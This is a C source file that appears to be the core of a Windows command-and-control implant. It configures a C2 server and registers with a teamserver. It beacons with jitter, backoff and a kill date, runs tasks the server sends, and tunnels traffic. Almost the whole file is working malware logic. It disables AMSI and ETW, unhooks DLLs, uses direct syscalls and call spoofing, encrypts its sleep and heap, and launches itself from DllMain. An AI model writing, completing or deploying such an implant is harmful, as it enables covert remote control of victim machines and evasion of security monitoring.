#include <windows.h>
#include <winsock2.h>
#include <winhttp.h>
#include <stdio.h>
#include "../../include/config.h"
#include "../../include/transport.h"
#include "../../include/tasks.h"
#include "../../include/evasion.h"
#include "../../include/tunnel.h"
#include "../../include/p2p_relay.h"
#include "../../include/transport.h"
#include "../../include/postex.h"
#include "../../include/sleep_stub.h"

#pragma comment(lib, "winhttp.lib")

static IMPLANT_CONFIG g_config;

static void init_config(void) {
    ZeroMemory(&g_config, sizeof(IMPLANT_CONFIG));

    lstrcpynA(g_config.c2_url, C2_URL, sizeof(g_config.c2_url));
    lstrcpynA(g_config.checkin_path, C2_CHECKIN_PATH, sizeof(g_config.checkin_path));
    lstrcpynA(g_config.register_path, C2_REGISTER_PATH, sizeof(g_config.register_path));
    lstrcpynA(g_config.result_path, C2_RESULT_PATH, sizeof(g_config.result_path));
    lstrcpynA(g_config.tunnel_path, C2_TUNNEL_PATH, sizeof(g_config.tunnel_path));
    lstrcpynA(g_config.user_agent, USER_AGENT, sizeof(g_config.user_agent));

    g_config.sleep_seconds   = SLEEP_SECONDS;
    g_config.jitter_percent  = JITTER_PERCENT;
    g_config.max_retries     = MAX_RETRIES;
    g_config.kill_date       = KILL_DATE;
    g_config.sleep_technique = SLEEP_TECHNIQUE;
    g_config.syscall_method  = SYSCALL_METHOD;
    g_config.patch_etw       = PATCH_ETW;
    g_config.patch_amsi      = PATCH_AMSI;
    g_config.unhook_on_load  = UNHOOK_ON_LOAD;
    g_config.heap_encrypt    = HEAP_ENCRYPT;
    g_config.running         = TRUE;
}

static void generate_implant_id(void) {
    DWORD tick = GetTickCount();
    DWORD pid  = GetCurrentProcessId();
    SYSTEMTIME st;
    GetSystemTime(&st);

    _snprintf(g_config.implant_id, sizeof(g_config.implant_id), "%08X-%04X-%04X",
        tick ^ pid,
        st.wMilliseconds ^ (WORD)(tick >> 16),
        (WORD)pid ^ st.wSecond);
}

static DWORD compute_sleep_ms(void) {
    DWORD base_ms = g_config.sleep_seconds * 1000;
    if (g_config.jitter_percent == 0) return base_ms;

    DWORD jitter_range = (base_ms * g_config.jitter_percent) / 100;
    DWORD jitter = 0;

    // Simple PRNG for jitter (replaced by better RNG in evasion module)
    LARGE_INTEGER counter;
    QueryPerformanceCounter(&counter);
    jitter = (DWORD)(counter.QuadPart % jitter_range);

    // Randomly add or subtract jitter
    if (counter.QuadPart & 1)
        return base_ms + jitter;
    else
        return (base_ms > jitter) ? base_ms - jitter : base_ms;
}

static BOOL check_kill_date(void) {
    if (g_config.kill_date == 0) return FALSE;

    FILETIME ft;
    GetSystemTimeAsFileTime(&ft);
    ULARGE_INTEGER now;
    now.LowPart  = ft.dwLowDateTime;
    now.HighPart = ft.dwHighDateTime;

    // Convert kill_date (unix timestamp) to FILETIME
    ULARGE_INTEGER kill;
    kill.QuadPart = ((ULONGLONG)g_config.kill_date * 10000000ULL) + 116444736000000000ULL;

    return (now.QuadPart >= kill.QuadPart);
}

static void beacon_sleep(DWORD ms) {
#if HEAP_ENCRYPT
    if (g_config.heap_encrypt) {
        heap_encrypt();
    }
#endif
    sleep_encrypt_technique(ms, g_config.sleep_technique);
#if HEAP_ENCRYPT
    if (g_config.heap_encrypt) {
        heap_decrypt();
    }
#endif
}

static void process_tasks(PC2_TASK tasks, DWORD count) {
    tasks_process_batch(&g_config, tasks, count);
}

void beacon_main(void) {
    init_config();
    generate_implant_id();
    p2p_relay_init(g_config.implant_id);
    p2p_relay_set_config(&g_config);

    // Kill date check before anything else
    if (check_kill_date()) return;

    // Anti-analysis gate (disabled by default in lab builds)
#if ANTI_ANALYSIS
    anti_analysis_init();
#endif

    // Hell's Gate syscall table (optional, compile-time gated)
    if (g_config.syscall_method) {
        syscall_init();
        spoof_init();
    }

    // Patchless AMSI/ETW bypass before any telemetry or scan paths run
#if AMSI_BYPASS_METHOD != BYPASS_METHOD_PATCH
    if (g_config.patch_etw || g_config.patch_amsi) {
        bypass_install();
    }
#endif

    // Apply evasion (patchless preferred; byte-patch fallback in patches.c)
    if (g_config.patch_etw) {
        patch_etw();
    }
    if (g_config.patch_amsi) {
        patch_amsi();
    }
    if (g_config.unhook_on_load) {
        unhook_all_known_dlls();
    }
    install_dll_load_monitor();

    if (!sleep_stub_self_test())
        g_config.sleep_technique = SLEEP_TECHNIQUE_FOLIAGE;

    // Initialize transport
    if (!transport_init(&g_config)) return;
    tunnel_init(&g_config);

    // Auto-enumeration on first beacon (included in registration payload)
    auto_enum_run();

    // Register with teamserver
    DWORD retries = 0;
    while (!transport_register(&g_config)) {
        if (++retries >= g_config.max_retries) return;
        beacon_sleep(compute_sleep_ms());
    }
    auto_enum_release();

    // Main beacon loop with exponential backoff and recovery
    DWORD base_sleep = g_config.sleep_seconds;
    DWORD consecutive_failures = 0;
    DWORD backoff_cap = 3600; // max 1 hour between retries

    while (g_config.running) {
        if (check_kill_date()) {
            g_config.running = FALSE;
            break;
        }

        PC2_TASK tasks = NULL;
        DWORD task_count = 0;

        if (transport_checkin(&g_config, &tasks, &task_count)) {
            tunnel_poll(&g_config);
            if (task_count > 0 && tasks != NULL) {
                process_tasks(tasks, task_count);
                HeapFree(GetProcessHeap(), 0, tasks);
            }

            // Success: reset backoff state
            if (consecutive_failures > 0) {
                g_config.sleep_seconds = base_sleep;
                consecutive_failures = 0;
            }
        } else {
            consecutive_failures++;

            if (consecutive_failures >= g_config.max_retries) {
                // Exponential backoff: double sleep on each failure tier
                DWORD new_sleep = g_config.sleep_seconds * 2;
                if (new_sleep > backoff_cap) new_sleep = backoff_cap;
                g_config.sleep_seconds = new_sleep;
            }

            // After extended failure, attempt re-registration
            if (consecutive_failures > 0 && (consecutive_failures % (g_config.max_retries * 3)) == 0) {
                transport_register(&g_config);
            }
        }

        beacon_sleep(compute_sleep_ms());
    }

    transport_cleanup();
    tunnel_cleanup();
    WSACleanup();
}

// Entry point - can be DllMain for DLL or main for EXE
#ifdef BUILD_DLL
BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hDll);
        HANDLE hThread = jager_create_thread(NULL, 0, (LPTHREAD_START_ROUTINE)beacon_main, NULL, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}
#else
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow) {
    beacon_main();
    return 0;
}
#endif
